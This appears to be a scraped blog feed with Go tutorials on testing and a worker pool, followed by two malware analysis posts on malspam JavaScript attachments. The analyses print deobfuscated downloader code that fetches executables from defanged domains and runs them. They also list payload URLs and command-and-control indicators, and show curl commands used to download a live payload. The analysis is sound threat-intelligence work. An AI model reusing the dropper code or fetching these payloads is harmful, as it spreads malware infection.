<p>As you can see the <code>ModelTest</code> structure is in essence the parameters necessary to run <code>Convey()</code>. Since <code>*testing.T</code> was passed in the outermost <code>Convey()</code> it is not necessary for these nested tests. There for we can pass it a <code>string</code> conveying what it will test and some arbitrary test <code>func()</code>. Below is the test of the <code>POST</code> portion of the RESTful interface for the user model. The other conveyed tests in <code>user_test.go</code> check <code>GET</code>, <code>PUT</code>, &amp; <code>DELETE</code> implementation.</p>

<pre><code class="language-go">var UserTest = ModelTest{  
    Title: "User Model Should",
    Func: func(store *Store) func() {
        return func() {
            Convey("Implement The CRUD Interface", func() {
                So(&amp;User{}, ShouldImplement, (*CRUD)(nil))
                Convey("A User Can Be Created", func() {
                    So(store.EWT(user.Create()), ShouldBeNil)
                    read := new(User)
                    pm := new(PropertyMap)
                    So(store.QWT(user.Read(), pm), ShouldBeNil)
                    data, err := json.Marshal(pm)
                    So(err, ShouldBeNil)
                    So(json.Unmarshal(data, read), ShouldBeNil)
                    So(read, ShouldResemble, user)
                })
      // Other Model tests go here ...
      })
    }
  },
}
</code></pre>

<h6 id="runningtests">Running Tests</h6>

<p>After writing all of our test cases for the model, we can implement the model using red to green testing. I will go into implementing a model at a later date but below is the output you would get after running <code>go test -v</code> with completed code.  </p>

<pre><code class="language-bash">=== RUN   TestDatabase

  The Database Should
    Be Configurable From A JSON File ✔✔✔✔✔
    Have Migrations For The Schema ✔


6 total assertions


  The Database User Model Should
    Implement The CRUD Interface ✔
      A User Can Be Created ✔✔✔✔✔✔
      A User Can Be Read ✔✔✔✔✔
      A User Can Be Updated ✔✔✔✔✔✔
      A User Can Be Deleted ✔✔


26 total assertions

--- PASS: TestDatabase (0.08s)
PASS  
ok      github.com/elauqsap/echo-postgres-json-api/database     0.083  
</code></pre>]]></content:encoded></item><item><title><![CDATA[Building a Go Work Pool]]></title><description><![CDATA[<p>I recently started working with <a href="https://golang.org/">Go</a> which is a very opinionated open source programming language from Google and contributors. It is a fantastic language and I rather enjoy how it has helped me develop as a programmer these past few months.</p>

<h6 id="backstory">Back Story</h6>

<p>My new position at work requires me</p>]]></description><link>https://stefanscherer.github.io/building-a-go-work-pool/</link><guid isPermaLink="false">4526082e-ac7f-4a8a-8831-378f845bb6f5</guid><category><![CDATA[development]]></category><category><![CDATA[go tips]]></category><dc:creator><![CDATA[Pasquale D'Agostino]]></dc:creator><pubDate>Thu, 05 May 2016 17:41:00 GMT</pubDate><media:content url="https://stefanscherer.github.io/content/images/2017/01/golang.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://stefanscherer.github.io/content/images/2017/01/golang.jpg" alt="Building a Go Work Pool"><p>I recently started working with <a href="https://golang.org/">Go</a> which is a very opinionated open source programming language from Google and contributors. It is a fantastic language and I rather enjoy how it has helped me develop as a programmer these past few months.</p>

<h6 id="backstory">Back Story</h6>

<p>My new position at work requires me to work with a large data set that I decided to truncate into smaller sets for processing. I wanted to process each batch in parallel but without restricting myself to a single "job type". So that in the future when the code requires a different "job type" I would not have to wrangle multiple work pools. In developing the solution, I found a work around to Go's lack of generics so I could process multiple "job types" via the same work pool. This code is modified from a blog post written <a href="http://marcio.io/2015/07/handling-1-million-requests-per-minute-with-golang/">here</a>. I also packaged this code for my reuse <a href="https://github.com/elauqsap/workerpool">here</a>.</p>

<h6 id="dispatcher">Dispatcher</h6>

<p>The role of the <code>Dispatcher</code> is to initialize the <code>WorkerPool</code>, dispatch jobs as they are created, and wait for the go routines to finish before closing out the main thread.</p>

<pre><code class="language-go">package main

import "sync"

// Dispatcher creates workers and dispatches jobs when received
type Dispatcher struct {  
    JobQueue   chan Job
    MaxWorkers int
    WaitGroup  *sync.WaitGroup
    // A pool of workers channels that are registered with the dispatcher
    WorkerPool chan chan Job
}

// NewDispatcher creates a dispatcher that is used to create workers
// and dispatch jobs to them
func NewDispatcher(maxWorkers int) *Dispatcher {  
    pool := make(chan chan Job, maxWorkers)
    return &amp;Dispatcher{JobQueue: make(chan Job, 1024), MaxWorkers: maxWorkers, WorkerPool: pool, WaitGroup: &amp;sync.WaitGroup{}}
}

// Run creates the workers and dispatches jobs from a JobQueue to each worker
func (d *Dispatcher) Run() {  
    // starting n number of workers
    for i := 0; i &lt; d.MaxWorkers; i++ {
        worker := NewWorker(d.WorkerPool, d.WaitGroup)
        worker.Start()
    }

  // start the dispatcher routine
    go d.dispatch()
}

func (d *Dispatcher) dispatch() {  
    for {
        select {
        case job := &lt;-d.JobQueue:
            // a job request has been received
            go func(job Job) {
                // try to obtain a worker job channel that is available.
                // this will block until a worker is idle
                jobChannel := &lt;-d.WorkerPool
                // dispatch the job to the worker job channel
                jobChannel &lt;- job
            }(job)
        }
    }
}
</code></pre>

<h6 id="worker">Worker</h6>

<p>A <code>Worker</code> is started by the <code>Dispatcher</code>and registers itself to the <code>WorkerPool</code>. Once a <code>Job</code> has been sent to the <code>Dispatcher</code>, it waits for a <code>Worker</code> to become ready for processing and hands off the <code>Job</code> to the <code>Worker</code>. The <code>Worker</code> triggers the <code>process()</code> method of the <code>Job</code>.</p>

<pre><code class="language-go">package main

import (  
    "fmt"
    "sync"
)

// Worker represents the worker that executes the job
type Worker struct {  
  // A pool of workers channels that are registered with the dispatcher
    WorkerPool chan chan Job
  // A channel for receiving a job that was dispatched
    JobChannel chan Job
  // A channel for receiving a worker termination signal
  // (quits after processing)
  quit       chan bool
  // A WaitGroup to signal the completed processing of a Job
    wg         *sync.WaitGroup
}

// NewWorker creates a new worker that can be registered to a WorkerPool
// and receive jobs
func NewWorker(workerPool chan chan Job, wg *sync.WaitGroup) Worker {  
    return Worker{
        WorkerPool: workerPool,
        JobChannel: make(chan Job),
        quit:       make(chan bool),
        wg:         wg}
}

// Start method starts the run loop for the worker, listening for a quit channel in
// case we need to stop it
func (w Worker) Start() {  
    go func() {
        for {
            // register the current worker into the worker queue.
            w.WorkerPool &lt;- w.JobChannel

            select {
            case job := &lt;-w.JobChannel:
                job.process()
              // signal to the wait group that a queued job has been processed
              // so the main thread can continue
                w.wg.Done()
            case &lt;-w.quit:
                // we have received a signal to stop
                return
            }
        }
    }()
}
</code></pre>

<h6 id="job">Job</h6>

<p>All <code>Job</code> types implement a <code>process()</code> method. This way we do not need to infer types in the <code>Worker</code> thus allowing us to achieve a level of generic types in Go.</p>

<pre><code class="language-go">package main

// Job interface will be implemented for each task so that they
// may be passed to workers in the pool by the dispatcher
type Job interface {  
    process() error
}

type BatchJob struct {  
  // define the struct
}

func (b BatchJob) process() error {  
  // process data here for batch sets ...
}

type SingleJob struct {  
  // define the struct
}

func (s SingleJob) process() error {  
  // process data here for a single set ...
}
</code></pre>

<h6 id="alltogethernow">All Together Now</h6>

<p>Here is an example of the above code in action. The <code>struct</code> need to be defined and <code>process()</code> implemented but it demonstrates the overall concept.</p>

<pre><code class="language-go">package main

func main() {  
  // Initialize a Dispatcher
  dispatcher := NewDispatcher(4)
  // Start the Dispatcher and create/register the Workers to the WorkerPool
  dispatcher.Run()
  // Queue two jobs for processing
  dispatcher.WaitGroup.Add(2)
  // Two jobs of different structures queued
  dispatcher.JobQueue &lt;- BatchJob{}
  dispatcher.JobQueue &lt;- SingleJob{}
  // Block main thread until processing in go routines completes
  dispatcher.WaitGroup.Wait()
}
</code></pre>]]></content:encoded></item><item><title><![CDATA[More Emails with Malicious JavaScript Attachments]]></title><description><![CDATA[<p>Slightly late but I ran into another malicious JavaScript attachment that appears to be downloading something besides Ransomware. From automated sandbox analysis it seems to be a Rovnix variant but I am not so sure. I plan to do a little more OSINT and provide an update but here is</p>]]></description><link>https://stefanscherer.github.io/more-emails-with-malicious-javascript-attachments/</link><guid isPermaLink="false">52d913d0-eb4f-4172-9e4c-fd04d68da4e0</guid><category><![CDATA[ransomware]]></category><category><![CDATA[threat intel]]></category><category><![CDATA[malspam]]></category><dc:creator><![CDATA[Pasquale D'Agostino]]></dc:creator><pubDate>Tue, 11 Aug 2015 14:44:00 GMT</pubDate><media:content url="https://stefanscherer.github.io/content/images/2017/01/ransomware-2.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://stefanscherer.github.io/content/images/2017/01/ransomware-2.jpg" alt="More Emails with Malicious JavaScript Attachments"><p>Slightly late but I ran into another malicious JavaScript attachment that appears to be downloading something besides Ransomware. From automated sandbox analysis it seems to be a Rovnix variant but I am not so sure. I plan to do a little more OSINT and provide an update but here is my analysis for now.</p>

<h6 id="emailindicators">Email Indicators</h6>

<pre><code>Received: from 1487.vanager.de (1487.vanager.de [195.225.105.38])
From: "Sofia Gallo" &lt;a.scelerisque.sed@mollisDuissit.edu&gt;
To: REDACTED
Subject: Attention! Reservation change.
Date: Sat, 8 Aug 2015
Attachment: Photo_8739.zip -&gt; IMG_7099.js
</code></pre>

<h6 id="messagebody">Message Body</h6>

<pre><code>I wanted to change a reservation!
Because some friends canceled, I would like to change reservation to two
double room!

Details of changes in attachment.
Thanks!
</code></pre>

<h6 id="deobfuscatingthejavascript">Deobfuscating the JavaScript</h6>

<p>There are a few subtle differences in this weeks example that make it different from the campaign we saw last week. Besides the actual malware being delivered, this file is not a double dot extension like last week where the file ended as <code>.doc.js</code>. The obfuscation is also slightly different because we didn't have to tweak the original code in order to see the function it builds for evaluation. The deobfuscated function also contains an array of domains that the script attempts to download 1 of 2 payloads (pdf or exe).</p>

<pre><code class="language-javascript  IMG_7099.js">// Key to deobfuscate
var key = 'eKTHj9DZ';

// redacted obfuscated function
var b = '\x03&gt;:+\x1eP+4E,;:\x1fMl?L0")\x18\x190gGz`e\x27x\x17\x15*\x06z\x0b%td\x10)\x02\x1a\x039t\x17t&amp;\x04\x19h)q\x01\x1b5\x19\x1d\x12/j\x09\x09K\x08\x1b\x05J|\x08\x1f(\x0e\x1a\x1c-l\x09\x080\x00z\x0b%tk6\x04%3=...';

var _0x12bd = ["", "\x6C\x65\x6E\x67\x74\x68", "\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74", "\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"];

// Build the function string to be evaluated
for(var dhhas3uu = _0x12bd[0], code = _0x12bd[0], j = 0, i = 0; i &lt; b[_0x12bd[1]]; i++) {  
    dhhas3uu += String[_0x12bd[3]](b[_0x12bd[2]](i) ^ key[_0x12bd[2]](j)), j++, j == key[_0x12bd[1]] &amp;&amp; (j = 0);
};

// Evaluate the deobfuscated JavaScript
eval(dhhas3uu);  
</code></pre>

<pre><code class="language-javascript">function gorut(e){  
    var t = "14-MASOOM.COM JLINKSMS.COM CHEAPRIZESMS.COM ELEMENTGUMRUK[.]COM/language IBMDATACAP[.]COM/wp-content/themes/academy WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework ITSMYTEA[.]COM/xmlrpc www.LANDTOURJAPAN[.]COM INTEGRITYSMSNG[.]COM CREATIVEFOODSTYLIST[.]COM www.KMDERUNJEWELRY[.]COM ADENYAOTELEET[.]COM MAJORCASE[.]ORG ISTANBULKLIMA[.]ORG ENTHELP[.]COM HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger TUGRAHOTELS[.]COM www.florianbruening[.]com JUALTOWERTRIANGLE[.]COM MAAKCARD[.]COM www.jakimbost[.]pl THEVILLAGEVETERINARYHOSPITAL[.]COM".split(" ");

    ex = "" == e ? ".exe" : ".pdf";

    for(var M = 0; M &lt; t.length; M++) {
        var n = new ActiveXObject("WScript.Shell"), O = n.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + Math.round(100000000.0 * Math.random()) + ex, E = 0, r = new ActiveXObject("MSXML2.XMLHTTP");
        r.onreadystatechange = function() {
            if(4 == r.readyState &amp;&amp; 200 == r.status) {
                var e = new ActiveXObject("ADODB.Stream");
                if(e.open(), e.type = 1, e.write(r.ResponseBody), 5000.0 &lt; e.size) {
                    E = 1, e.position = 0, e.saveToFile(O, 2);
                    try {
                        n.Run(O, 1, 0);
                    } catch(t) {

                    }
                }
                e.close();
            }
        };
        try {
            r.open("GET", "hxxp://" + t[M] + "/get.php?dgfdfg=" + Math.random() + "&amp;key=" + key + e, !1), r.send();
        } catch(a) {

        }
        if(1 == E) break;
    }
}

key = "f5", gorut(""), gorut("&amp;pdf=search");  
</code></pre>

<p>Removing a few lines in <code>gorut()</code> routine of the download script allows to print out download links for the two payloads it attempts to get. Basically you need to remove the ActiveX code and modify <code>r.open</code> to <code>console.log</code> function removing the <code>!1</code> parameter. Running this in node.js will give us a list of payload downloads for the second stage.</p>

<pre><code class="language-javascript">function gorut(e){  
    var t = "14-MASOOM.COM JLINKSMS.COM CHEAPRIZESMS.COM ELEMENTGUMRUK[.]COM/language IBMDATACAP[.]COM/wp-content/themes/academy WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework ITSMYTEA[.]COM/xmlrpc www.LANDTOURJAPAN[.]COM INTEGRITYSMSNG[.]COM CREATIVEFOODSTYLIST[.]COM www.KMDERUNJEWELRY[.]COM ADENYAOTELEET[.]COM MAJORCASE[.]ORG ISTANBULKLIMA[.]ORG ENTHELP[.]COM HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger TUGRAHOTELS[.]COM www.florianbruening[.]com JUALTOWERTRIANGLE[.]COM MAAKCARD[.]COM www.jakimbost[.]pl THEVILLAGEVETERINARYHOSPITAL[.]COM".split(" ");

    ex = "" == e ? ".exe" : ".pdf";
    for(var M = 0; M &lt; t.length; M++) {
        console.log("GET", "hxxp://" + t[M] + "/get.php?dgfdfg=" + Math.random() + "&amp;key=" + key + e);
    }
}
</code></pre>

<h6 id="payloadlinks">Payload Links</h6>

<pre><code>GET hxxp://14-MASOOM[.]COM/get.php?dgfdfg=0.2042055584024638&amp;key=f5
GET hxxp://JLINKSMS[.]COM/get.php?dgfdfg=0.4357860581949353&amp;key=f5
GET hxxp://CHEAPRIZESMS[.]COM/get.php?dgfdfg=0.9873443075921386&amp;key=f5
GET hxxp://ELEMENTGUMRUK[.]COM/language/get.php?dgfdfg=0.697707447456196&amp;key=f5
GET hxxp://IBMDATACAP[.]COM/wp-content/themes/academy/get.php?dgfdfg=0.21713185170665383&amp;key=f5
GET hxxp://WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework/get.php?dgfdfg=0.5791356258559972&amp;key=f5
GET hxxp://ITSMYTEA[.]COM/xmlrpc/get.php?dgfdfg=0.5410346924327314&amp;key=f5
GET hxxp://www.LANDTOURJAPAN[.]COM/get.php?dgfdfg=0.418818884762004&amp;key=f5
GET hxxp://INTEGRITYSMSNG[.]COM/get.php?dgfdfg=0.029143808409571648&amp;key=f5
GET hxxp://CREATIVEFOODSTYLIST[.]COM/get.php?dgfdfg=0.3915193013381213&amp;key=f5
GET hxxp://www.KMDERUNJEWELRY[.]COM/get.php?dgfdfg=0.07052874471992254&amp;key=f5
GET hxxp://ADENYAOTELEET[.]COM/get.php?dgfdfg=0.8330098567530513&amp;key=f5
GET hxxp://MAJORCASE[.]ORG/get.php?dgfdfg=0.5714250793680549&amp;key=f5
GET hxxp://ISTANBULKLIMA[.]ORG/get.php?dgfdfg=0.6278960527852178&amp;key=f5
GET hxxp://ENTHELP[.]COM/get.php?dgfdfg=0.48202996351756155&amp;key=f5
GET hxxp://HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger/get.php?dgfdfg=0.2205682178027928&amp;key=f5
GET hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5
GET hxxp://www.florianbruening[.]com/get.php?dgfdfg=0.0033856993541121483&amp;key=f5
GET hxxp://JUALTOWERTRIANGLE[.]COM/get.php?dgfdfg=0.7687414824031293&amp;key=f5
GET hxxp://MAAKCARD[.]COM/get.php?dgfdfg=0.14662570762448013&amp;key=f5
GET hxxp://www.jakimbost[.]pl/get.php?dgfdfg=0.4327525827102363&amp;key=f5
GET hxxp://THEVILLAGEVETERINARYHOSPITAL[.]COM/get.php?dgfdfg=0.48534721904434264&amp;key=f5
GET hxxp://14-MASOOM[.]COM/get.php?dgfdfg=0.6709314966574311&amp;key=f5&amp;pdf=search
GET hxxp://JLINKSMS[.]COM/get.php?dgfdfg=0.020113263744860888&amp;key=f5&amp;pdf=search
GET hxxp://CHEAPRIZESMS[.]COM/get.php?dgfdfg=0.6769137345254421&amp;key=f5&amp;pdf=search
GET hxxp://ELEMENTGUMRUK[.]COM/language/get.php?dgfdfg=0.1893466750625521&amp;key=f5&amp;pdf=search
GET hxxp://IBMDATACAP[.]COM/wp-content/themes/academy/get.php?dgfdfg=0.11392477317713201&amp;key=f5&amp;pdf=search
GET hxxp://WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework/get.php?dgfdfg=0.7516817327123135&amp;key=f5&amp;pdf=search
GET hxxp://ITSMYTEA[.]COM/xmlrpc/get.php?dgfdfg=0.45238890522159636&amp;key=f5&amp;pdf=search
GET hxxp://www.LANDTOURJAPAN[.]COM/get.php?dgfdfg=0.5003419334534556&amp;key=f5&amp;pdf=search
GET hxxp://INTEGRITYSMSNG[.]COM/get.php?dgfdfg=0.7602681068237871&amp;key=f5&amp;pdf=search
GET hxxp://CREATIVEFOODSTYLIST[.]COM/get.php?dgfdfg=0.2591306504327804&amp;key=f5&amp;pdf=search
GET hxxp://www.KMDERUNJEWELRY[.]COM/get.php?dgfdfg=0.19865264417603612&amp;key=f5&amp;pdf=search
GET hxxp://ADENYAOTELEET[.]COM/get.php?dgfdfg=0.8011750828009099&amp;key=f5&amp;pdf=search
GET hxxp://MAJORCASE[.]ORG/get.php?dgfdfg=0.7017634396906942&amp;key=f5&amp;pdf=search
GET hxxp://ISTANBULKLIMA[.]ORG/get.php?dgfdfg=0.33236109651625156&amp;key=f5&amp;pdf=search
GET hxxp://ENTHELP[.]COM/get.php?dgfdfg=0.25800628517754376&amp;key=f5&amp;pdf=search
GET hxxp://HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger/get.php?dgfdfg=0.4463676530867815&amp;key=f5&amp;pdf=search
GET hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5060989174526185&amp;key=f5&amp;pdf=search
GET hxxp://www.florianbruening[.]com/get.php?dgfdfg=0.8751774763222784&amp;key=f5&amp;pdf=search
GET hxxp://JUALTOWERTRIANGLE[.]COM/get.php?dgfdfg=0.08316186326555908&amp;key=f5&amp;pdf=search
GET hxxp://MAAKCARD[.]COM/get.php?dgfdfg=0.8340241997502744&amp;key=f5&amp;pdf=search
GET hxxp://www.jakimbost[.]pl/get.php?dgfdfg=0.9773174184374511&amp;key=f5&amp;pdf=search
GET hxxp://THEVILLAGEVETERINARYHOSPITAL[.]COM/get.php?dgfdfg=0.6214603304397315&amp;key=f5&amp;pdf=search
</code></pre>

<p>So now that we have the payload URLs we can download them for further analysis. It attempts to download either a malicious executable or pdf. The URLs without <code>&amp;pdf=search</code> on the end are the MS-DOS executables. When attempting to download these I noticed that my curl command was failing with my Firefox user agent (404 page). Switching it to a traditional IE10 user agent allowed me to download the payload. </p>

<h6 id="failedcommand">Failed Command</h6>

<pre><code>curl -vA "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0" -L "hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5" &gt; bad_dl.exe

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                               Dload  Upload   Total   Spent    Left  Speed
0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 159.253.42.153...
Connected to TUGRAHOTELS[.]COM (159.253.42.153) port 80 (#0)

GET /get.php?dgfdfg=0.5332026502583176&amp;key=f5 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Host: TUGRAHOTELS[.]COM
Accept: */*

HTTP/1.1 200 OK
Content-Type: application/x-msdownload
Content-Disposition: inline; filename=Adobe_update-YXXQ1RX4IL6LV2M.exe
Content-Length: 3
Date: Tue, 11 Aug 2015 21:01:02 GMT
Accept-Ranges: bytes
Server LiteSpeed is not blacklisted
Server: LiteSpeed
Connection: close

{ [data not shown]
100     3  100     3    0     0      2      0  0:00:01  0:00:01 --:--:--     2
Closing connection 0
</code></pre>

<h6 id="successfulcommand">Successful Command</h6>

<pre><code>curl -vA "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" -L "hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5" &gt; bad

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                               Dload  Upload   Total   Spent    Left  Speed
0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 159.253.42.153...
Connected to TUGRAHOTELS.COM (159.253.42.153) port 80 (#0)
GET /get.php?dgfdfg=0.5332026502583176&amp;key=f5 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
Host: TUGRAHOTELS[.]COM
Accept: */*

HTTP/1.1 200 OK
Content-Type: application/x-msdownload
Content-Disposition: inline; filename=Adobe_update-ZLFNDKIGUO7.exe
Date: Tue, 11 Aug 2015 21:03:35 GMT
Accept-Ranges: bytes
Server LiteSpeed is not blacklisted
Server: LiteSpeed
Connection: close

{ [data not shown]
100  214k    0  214k    0     0  89872      0 --:--:--  0:00:02 --:--:-- 89872
Closing connection 0
</code></pre>

<p>Unfortunately, I was only able to get the network indicators below from the executable and none from the pdf file. I am working on beefing up my sandboxing environment to better handle situations like this but until then I will have to leave this post as is for now. Hopefully I can provide an update on the malware family as well as any further OSINT I find. Please feel free to contact me about the analysis or any questions you have.</p>

<h6 id="adobe_updateyxxq1rx4il6lv2mexeanalysis">Adobe_update-YXXQ1RX4IL6LV2M.exe Analysis</h6>

<pre><code>GET hxxp://109.120.142.168:80/ac33/b/btc.exe
GET hxxp://109.120.142.168:80/ac33/p/pc.exe
GET hxxp://109.120.142.168:80/ac33/g/gc.exe
GET hxxp://109.120.142.168:80/ac33/bk/bkc.exe
POST hxxp://109.120.180.29:80/intro/data.php
Server IP: 109.120.180.29

GET hxxp://constitution.org:80/usdeclar.txt
Server IP: 54.175.58.135
</code></pre>]]></content:encoded></item><item><title><![CDATA[Ransomware from Emails with JavaScript Attachments]]></title><description><![CDATA[<p>Recently I have been seeing emails with zip attachments that contain a malicious JavaScript file marked as a double dot extension (.doc.js). The JavaScript is obfuscated but debofuscating it is rather easy and I wanted to share my analysis. The infection appears to be Ransomware, most likely a CryptoWall</p>]]></description><link>https://stefanscherer.github.io/ransomware-from-emails-with-javascript-attachments/</link><guid isPermaLink="false">68c75cc3-5b91-47d3-9fa6-b8aa82f53121</guid><category><![CDATA[threat intel]]></category><category><![CDATA[ransomware]]></category><category><![CDATA[malspam]]></category><dc:creator><![CDATA[Pasquale D'Agostino]]></dc:creator><pubDate>Wed, 05 Aug 2015 14:12:00 GMT</pubDate><media:content url="https://stefanscherer.github.io/content/images/2017/01/ransomware-1.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://stefanscherer.github.io/content/images/2017/01/ransomware-1.jpg" alt="Ransomware from Emails with JavaScript Attachments"><p>Recently I have been seeing emails with zip attachments that contain a malicious JavaScript file marked as a double dot extension (.doc.js). The JavaScript is obfuscated but debofuscating it is rather easy and I wanted to share my analysis. The infection appears to be Ransomware, most likely a CryptoWall 3.0 variant but I did not verify it.</p>

<h6 id="emailindicators">Email Indicators</h6>

<pre><code>Received: from uplander.websitewelcome.com (uplander.websitewelcome.com [192.185.179.118])
Subject: Notice to appear in Court #00000536215
From: "State Court" &lt;allan.barnett@ns963.websitewelcome.com&gt;
Reply-To: "State Court" &lt;allan.barnett@ns963.websitewelcome.com&gt;
Attachment: 00000536215.zip -&gt; 00000536215.doc.js
</code></pre>

<h6 id="messagebody">Message Body</h6>

<pre><code>Notice to Appear,

This is to inform you to appear in the Court on the August 11 for your case hearing.
Please, do not forget to bring all the documents related to the case.
Note: The case may be heard by the judge in your absence if you do not come.

The copy of Court Notice is attached to this email.

Yours faithfully,
Allan Barnett,
Court Secretary.
</code></pre>

<h6 id="deobfuscatingthejavascript">Deobfuscating the JavaScript</h6>

<p>Below is the original decompressed file contents. It tries to hide itself as a better known file type (.doc) but any modern operating system would most likely recognize and interpret the JavaScript file. Luckily for us, it is rather easy to deobfuscate something like this. You can use a tool like JSDetox or use a JavaScript interpreter like node.js. The key thing we need to overcome is that JSDetox and node.js most likely won't have access to ActiveX so we have to remove the check otherwise it will not deobfuscate.</p>

<pre><code class="language-javascript">// redacted obfuscated variables
var jlavws = 'fpubnwcytwieoenq sdblf(hfyrm...';  
var jdmkdr = 'mtgreilnxgxse(a"p%cTiEoMfPf%h"f)...';  
var xxjg = 'ncrkewandpyxsntgaztbeoclhxacnsgaej...';  
var bpm = 'ptrrseaawms"l)o;v r q k w c...';  
var his = ' oxtau.eslakvheqTmoyFyiilzeg(dfsnk,r h2p)...';  
var bey = 'ldh(l)k;b c o o yiqfe p(irfnt b&gt;g u0b)...';  
var yjb = 'iwmcaygqeusr/ufeixvjeh1m.ojzptgh...';

var buh = 'l;q';  
var a1 = jlavws + jdmkdr + xxjg + bpm + his + bey + yjb + buh;  
var a2 = "";  
var a3 = 2;  
var a4 = 0; // Hardcode to 0, originally set to 10

/* 1.
  Checks for ActiveX otherwise it will not deobfuscate
  We can comment this out in JSDetox and hard code a4 to 0
*/
var y = new ActiveXObject("Scripting.Dictionary");  
y.add("a", "t");  
if(y.Item("a") == "t") {  
    a4 = 0;
} else {
    a4 = 10;
};

/* 2.
  This function will deobfuscate and build the string to be evaluated below
*/
var a5 = a1.length;  
var a = 0;  
while(a &lt; a5) {  
    a2 += a1.charAt(a);
    a += a3 + a4;
};

/* 3.
  Transforms to set a6 = 'eval'
*/
var rosa = ["e", "0", "v", "0", "a", "0", "l", "0"];  
var tosta = rosa[0 + a4] + rosa[2 + a4] + rosa[4 + a4] + rosa[6 + a4];  
var a6 = tosta;

/* 4.
  The eval() function and a2 is the deobfuscated string to run
*/
// this[a6](a2);
</code></pre>

<p>I added comments to point out the key points to be aware of when running this through JSDetox/node. The first comment is where the script checks for ActiveX which both tools will not have access to out of the box. Looking at the code we can see the default value <code>a4 = 10</code> breaks the while loop before it can build the deobfuscated string. If we simply hard code <code>a4 = 0</code> before the loop and comment/delete the while loop it will build the string as intended. In the end the two values we care most about are <code>a2</code> and <code>a6</code>. When the script gets to <code>this[a6](a2)</code> it is essentially performing an <code>eval()</code> operation on the debofuscated string stored in <code>a2</code>.</p>

<pre><code class="language-javascript">function dl(fr, fn, rn){  
  var ws = new ActiveXObject("WScript.Shell");
  var fn = ws.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + fn;
  var xo = new ActiveXObject("MSXML2.XMLHTTP");
  xo.onreadystatechange = function (){
    if (xo.readyState === 4){
      var xa = new ActiveXObject("ADODB.Stream");
      xa.open();
      xa.type = 1;
      xa.write(xo.ResponseBody);
      xa.position = 0;
      xa.saveToFile(fn, 2);
      xa.close();
    };
  };
  try {
    xo.open("GET", fr, false);
    xo.send();
    if (rn &gt; 0){
      ws.Run(fn, 0, 0);
    };
  }  catch (er){  };
}
dl("hxxp://31072015a[.]com/images/five1.jpg", "532747350.exe",1);   // Download payload 1  
dl("hxxp://31072015a[.]com/images/five2.jpg", "211954869.exe", 1);  // Download payload 2  
</code></pre>

<p>Now that we have a readable version of the JavaScript it is pretty easy to tell what it is doing. Basically the script downloads the two files <code>five1.jpg</code> and <code>five2.jpg</code> which are actually MS-DOS executables. Then using a Windows Script Host Shell it attempts to run each of the downloaded payloads.</p>

<p>Here are some of the network indicators and behaviors I observed from sandboxing the payloads. If you have any questions or comments about the analysis feel free to reach out to me.</p>

<h6 id="five1jpg532747350exeanalysis">five1.jpg/532747350.exe Analysis</h6>

<pre><code># Payload Download: Response
* Connected to 31072015a[.]com (195.225.228.156) port 80 (#0)
GET /images/five1.jpg HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Host: 31072015a[.]com
Accept: */*

HTTP/1.1 200 OK
Server: Apache/2.2.15 (CentOS)
Last-Modified: Wed, 05 Aug 2015 21:35:01 GMT
ETag: "c10000c-40e00-51c972cdc4b23"
Accept-Ranges: bytes
Content-Length: 265728
Connection: close

# Registry Activity
Modifies registry to disable system restore
Creates a file in the windows start menu folder
Modifies autorun registry key values

# Network Traffic
GET hxxp://ip-addr[.]es:80/
Server IP: 188.165.164.184

POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?w=cg1odjtnay
POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?n=t1dfbt93fg
POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?h=qovvtc388iq4bm
POST hxxp://bethel[.]vn:80/wp-content/themes/twentytwelve/b.php?t=4l425ka9qjn
Server IP: 112.78.2.209

POST hxxp://aeusasoftball[.]com:80/wp-content/themes/sports-team-theme/includes/adva...cg1odjtnay
Server IP: 184.168.47.225

GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?b=cg1odjtnay
GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?f=t1dfbt93fg
GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?p=qovvtc388iq4bm
GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?y=4l425ka9qjn
POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?b=cg1odjtnay
POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?f=t1dfbt93fg
